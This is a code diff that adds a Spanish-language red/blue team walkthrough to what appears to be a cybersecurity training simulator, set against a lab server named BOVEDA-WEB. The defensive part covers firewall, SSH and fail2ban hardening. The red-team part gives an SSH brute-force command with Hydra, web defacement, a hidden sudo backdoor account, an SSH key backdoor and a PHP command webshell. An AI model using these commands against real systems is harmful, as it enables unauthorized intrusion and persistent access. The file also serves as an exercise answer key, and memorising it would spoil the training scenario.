@@ -159,6 +159,304 @@ export const DEFAULT_SIMULATION_STATE = {
 // Static Content Data
 // ============================================================================
 
+export const SCENARIO_7_GUIDE = `
+🎯 Objetivos del Escenario
+Equipo Azul (Defensor)
+
+Activar y configurar el firewall UFW
+Deshabilitar login directo de root en SSH
+Asegurar archivos sensibles con permisos correctos
+Monitorear intentos de intrusión
+Implementar fail2ban (opcional)
+
+Equipo Rojo (Atacante)
+
+Realizar reconocimiento del servidor
+Obtener credenciales mediante fuerza bruta
+Comprometer el servidor
+Modificar archivos web
+Establecer persistencia (opcional)
+
+
+🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
+Fase 1: Activación del Firewall
+El firewall es tu primera línea de defensa. Es crítico activarlo correctamente.
+bash# 1. Conectarse al servidor
+ssh blue-team@BOVEDA-WEB
+# Contraseña: SecureP@ss2024!
+
+# 2. Verificar estado actual del firewall
+sudo ufw status
+# Debe mostrar: Status: inactive
+
+# 3. CRÍTICO: Permitir SSH primero (o te quedarás bloqueado)
+sudo ufw allow ssh
+# O específicamente: sudo ufw allow 22/tcp
+
+# 4. Permitir servicios web necesarios
+sudo ufw allow http
+sudo ufw allow https
+# O: sudo ufw allow 80/tcp
+# O: sudo ufw allow 443/tcp
+
+# 5. BLOQUEAR MySQL (no debe ser accesible externamente)
+sudo ufw deny 3306/tcp
+
+# 6. Activar el firewall
+sudo ufw enable
+# Confirmar con 'y'
+
+# 7. Verificar configuración
+sudo ufw status numbered
+Puntos ganados: 20 + 5 (bonus por bloquear MySQL)
+Fase 2: Hardening de SSH
+Deshabilitar el login directo de root es una práctica de seguridad fundamental.
+bash# 1. Editar configuración de SSH
+sudo nano /etc/ssh/sshd_config
+
+# 2. Buscar la línea:
+# PermitRootLogin yes
+
+# 3. Cambiarla a:
+# PermitRootLogin no
+
+# 4. Guardar y salir (Ctrl+X, Y, Enter)
+
+# 5. Reiniciar el servicio SSH para aplicar cambios
+sudo systemctl restart sshd
+
+# 6. Verificar que el cambio se aplicó
+grep "PermitRootLogin" /etc/ssh/sshd_config
+Puntos ganados: 15
+Fase 3: Seguridad de Archivos
+Aplicar el principio de menor privilegio a archivos sensibles.
+bash# 1. Verificar permisos actuales del archivo de configuración
+ls -l /var/www/html/db_config.php
+# Verás algo como: -rw-r--r-- (644)
+# Esto significa que CUALQUIERA puede leer el archivo (peligroso)
+
+# 2. Cambiar permisos a 640
+sudo chmod 640 /var/www/html/db_config.php
+
+# 3. Verificar el cambio
+ls -l /var/www/html/db_config.php
+# Ahora debe mostrar: -rw-r----- (640)
+# Solo el propietario puede escribir, el grupo puede leer, otros no tienen acceso
+
+# 4. Opcionalmente, cambiar propietario
+sudo chown www-data:www-data /var/www/html/db_config.php
+Explicación de permisos:
+
+644: Owner (rw-) Group (r--) Others (r--) ❌ Inseguro
+640: Owner (rw-) Group (r--) Others (---) ✅ Seguro
+600: Owner (rw-) Group (---) Others (---) ✅ Más seguro
+
+Puntos ganados: 15
+Fase 4: Monitoreo Activo
+Detectar ataques en tiempo real.
+bash# 1. Monitorear intentos de login fallidos
+grep "Failed" /var/log/auth.log | tail -20
+
+# O en sistemas con journald:
+journalctl -u sshd | grep "Failed"
+
+# 2. Ver en tiempo real (ejecutar en otra terminal)
+tail -f /var/log/auth.log
+
+# 3. Verificar servicios escuchando
+sudo ss -tulnp
+# Deberías ver solo SSH (22), HTTP (80), HTTPS (443)
+# Si ves MySQL (3306), el firewall no está configurado correctamente
+
+# 4. Verificar carga del sistema
+top
+# o mejor:
+htop
+
+# 5. Ver conexiones activas
+sudo netstat -antp | grep ESTABLISHED
+Puntos ganados: 5 (bonus)
+Fase 5: Fail2Ban (Bonus - Avanzado)
+Banear automáticamente IPs que intentan fuerza bruta.
+bash# 1. Instalar fail2ban
+sudo apt update
+sudo apt install fail2ban -y
+
+# 2. Crear configuración local
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+
+# 3. Editar configuración
+sudo nano /etc/fail2ban/jail.local
+
+# 4. Configurar la jail de SSH:
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+findtime = 600
+
+# 5. Reiniciar fail2ban
+sudo systemctl restart fail2ban
+
+# 6. Verificar estado
+sudo fail2ban-client status sshd
+
+# 7. Ver IPs baneadas
+sudo fail2ban-client get sshd banned
+
+# 8. Desbanear una IP manualmente (si es necesario)
+sudo fail2ban-client unban 192.168.1.100
+Puntos ganados: 10 (bonus)
+Checklist de Seguridad - Equipo Azul
+
+ Firewall UFW activado y configurado
+ Solo puertos necesarios abiertos (22, 80, 443)
+ MySQL bloqueado (3306)
+ PermitRootLogin configurado a "no"
+ SSH reiniciado para aplicar cambios
+ Permisos de db_config.php cambiados a 640
+ Monitoreo de logs activo
+ Fail2ban instalado y configurado (bonus)
+
+
+🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
+Fase 1: Reconocimiento
+Primero, necesitas saber qué está abierto y qué versiones están corriendo.
+bash# 1. Desde la terminal soc-valtorix (tu Kali)
+# Escaneo básico de puertos
+nmap BOVEDA-WEB
+
+# 2. Escaneo detallado con detección de versiones
+nmap -sV -sC BOVEDA-WEB
+
+# 3. Escaneo completo (más lento pero exhaustivo)
+nmap -sV -sC -p- BOVEDA-WEB
+
+# 4. Escaneo de vulnerabilidades
+nmap --script vuln BOVEDA-WEB
+¿Qué buscar?
+
+Puerto 22 (SSH) - ¿Está abierto?
+Puerto 3306 (MySQL) - ¿Está expuesto? (Vulnerabilidad crítica)
+Puerto 80/443 (HTTP/HTTPS) - ¿Qué servidor web?
+Versiones de servicios - ¿Hay CVEs conocidos?
+
+Puntos ganados: 10
+Fase 2: Ataque de Fuerza Bruta
+Si el Equipo Azul no aseguró SSH, puedes obtener credenciales.
+bash# 1. Preparar wordlist (ya está en Kali)
+ls /usr/share/wordlists/
+# Usa rockyou.txt (es la más común)
+
+# 2. Ataque de fuerza bruta con Hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB
+
+# 3. Ataque más rápido con menos intentos
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB -t 4
+
+# 4. Si encuentras la contraseña "toor", verás:
+# [22][ssh] host: BOVEDA-WEB login: root password: toor
+⚠️ Nota importante:
+
+Este ataque SOLO funciona si PermitRootLogin está en "yes"
+Si el Equipo Azul lo deshabilitó, verás: "Permission denied"
+El ataque será visible en /var/log/auth.log del servidor
+
+Puntos ganados: 25
+Fase 3: Compromiso del Servidor
+Una vez que tienes credenciales, accede al servidor.
+bash# 1. Conectarse vía SSH
+ssh root@BOVEDA-WEB
+# Contraseña: toor (si el brute force fue exitoso)
+
+# 2. Verificar que estás dentro
+whoami
+# Debe mostrar: root
+
+hostname
+# Debe mostrar: BOVEDA-WEB
+
+# 3. Reconocimiento interno
+ls -la /var/www/html/
+cat /etc/passwd
+ps aux
+netstat -antp
+Puntos ganados: 20
+Fase 4: Explotación Web
+Modificar el sitio web para demostrar el compromiso.
+bash# 1. Ver el hash original del archivo
+sha256sum /var/www/html/index.php
+
+# 2. Modificar el archivo index.php
+nano /var/www/html/index.php
+
+# 3. Agregar tu marca (ejemplo):
+<?php
+echo "<!DOCTYPE html><html><body>";
+echo "<h1 style='color:red;'>PWNED BY RED TEAM</h1>";
+echo "<p>BOVEDA-WEB has been compromised</p>";
+echo "</body></html>";
+?>
+
+# 4. Guardar (Ctrl+X, Y, Enter)
+
+# 5. Verificar que el hash cambió
+sha256sum /var/www/html/index.php
+# Debe ser diferente al original
+Puntos ganados: 35
+Fase 5: Persistencia (Bonus - Avanzado)
+Mantener acceso incluso si cambian las contraseñas.
+Opción 1: Crear cuenta backdoor
+bash# 1. Crear usuario oculto
+useradd -m -s /bin/bash sys-update
+
+# 2. Dar permisos sudo
+usermod -aG sudo sys-update
+
+# 3. Establecer contraseña
+echo "sys-update:BackdoorP@ss123" | chpasswd
+
+# 4. Probar acceso
+ssh sys-update@BOVEDA-WEB
+Opción 2: Clave SSH
+bash# 1. En tu Kali, generar par de claves
+ssh-keygen -t rsa -b 4096 -f ~/.ssh/boveda_backdoor
+
+# 2. Copiar clave pública al servidor
+# (Estando ya dentro como root)
+mkdir -p /root/.ssh
+echo "tu-clave-publica-aqui" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# 3. Ahora puedes conectar sin contraseña
+ssh -i ~/.ssh/boveda_backdoor root@BOVEDA-WEB
+Opción 3: Webshell
+bash# 1. Crear webshell simple
+cat > /var/www/html/shell.php << 'EOF'
+<?php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+EOF
+
+# 2. Usar desde navegador o curl
+curl "http://BOVEDA-WEB/shell.php?cmd=whoami"
+Puntos ganados: 15 (bonus)
+Checklist de Ataque - Equipo Rojo
+
+ Reconocimiento completo con nmap
+ Identificación de servicios vulnerables
+ Fuerza bruta exitosa (si SSH no está asegurado)
+ Acceso root obtenido
+ index.php modificado (hash diferente)
+ Persistencia establecida (opcional)
+ Documentación de todos los pasos
+`;
+
 export const GLOSSARY_TERMS: GlossaryTerm[] = [
     { term: "Dirección IP (IPv4/IPv6)", definition: "Identificador numérico único para dispositivos en una red. (Ver: Guía IP, Fundamentos)" },
     { term: "Modelo OSI", definition: "Modelo teórico de 7 capas (Física, Enlace, Red, Transporte, Sesión, Presentación, Aplicación) para entender la comunicación de redes. (Ver: Protocolos, Fundamentos)" },
